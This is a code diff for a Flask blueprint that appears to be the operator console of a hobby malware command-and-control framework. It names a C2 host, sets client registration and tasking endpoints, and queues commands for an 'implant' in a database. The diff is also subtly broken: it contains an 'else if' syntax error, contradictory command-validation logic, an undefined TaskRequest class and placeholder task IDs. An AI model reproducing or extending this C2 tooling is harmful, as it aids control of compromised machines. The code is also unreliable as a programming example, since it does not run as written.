@@ -6,17 +6,18 @@ import secrets
 from cvnt.client_pb2 import *
 from urllib.parse import urljoin
 from cvnt.client_pb2 import Command, ClientTaskRequest, ClientTaskResponse, Packet
-from cvnt.constants import opcodes
+from cvnt.constants import opcodes, extras
 import requests 
+from cvnt.db_operations import make_task
 
 client = Blueprint('client', __name__, template_folder='templates')
 c2 = "https://rigmalwarole.com"
-task_list = "/task/list"
-task_create = "task/create"
-register = "/register"
-request = "/request"
-response = "/response"
-packet = "/packet"
+task_list = "/client/task/list"
+task_create = "/client/task/create"
+register = "/client/register"
+request = "/client/request"
+response = "/client/response"
+packet = "/client/packet"
 
 
 class Terminal(FlaskForm):
@@ -37,45 +38,46 @@ def index():
             firstword, leftoverstring = parts
         except: 
             firstword = parts[0]
-        if valid_command(firstword):
+        if parts[1] in opcodes:
             msg = Command()
             msg.cmd = firstword
             msg.args = leftoverstring
             print('Slay Baddies your command was received successfully!')
-            #error_message = analyze_input(firstword, leftoverstring)
-            handle_t_request(1, msg.cmd, msg.args)
+            handle_task_request("implantIdExample", msg.cmd, msg.args)
+        else if firstword in extras:
+            pass
         else:
             error_message = 'Invalid Command Loser :('  # Set the error message
     return render_template('index.html', form=form, cmd=whole, error_message=error_message)
 
 def valid_command(cmd):
-    if cmd not in opcodes:
+    if cmd not in opcodes or cmd not in extras:
         return False
     return True
 
 def analyze_input(cmd, args):
     pass
 
-
-@client.route('/task/request', methods=["POST"])
-def handle_t_request(implant_id, cmd, args):
+def handle_local_request(cmd, args):
+    pass
+    
+# @client.route('/client/task/request', methods=["POST"])
+def handle_task_request(implant_id, cmd, args):
     print(f'REQUEST FROM CLIENT')
-    r = ClientTaskRequest()
-    r.ImplantID = implant_id
-    r.JobID = 1  # static for testing
-    r.Function = cmd
-    r.Inputs = args
-    out = r.SerializeToString()
+    tr = TaskRequest()
+    tr.TaskID = "sometaskId idk" # needs to be genrerated
+    tr.Opcode = to_opcode(cmd)
+    tr.args = args
 
-    # Correct URL to the send_task route
-    full_url = urljoin(c2, '/task/request')
-    response = requests.post(full_url, data=out)
-    if response.status_code == 200:
-        print("Task successfully sent to the RPC service.")
-    else:
-        print(f"Failed to send task, server responded with status code: {response.status_code}")
-    return response.text
+    new_task = make_task(implant_id, tr)
 
+    print("new task made")
+    print(new_task)
+    db.session.add(new_task)
+    print("added task")
+    db.session.commit()
+    print("committed task")
+    return "True"
 
 @client.route(response, methods=["POST"])
 def handle_t_response(implant_id, jobID, output):
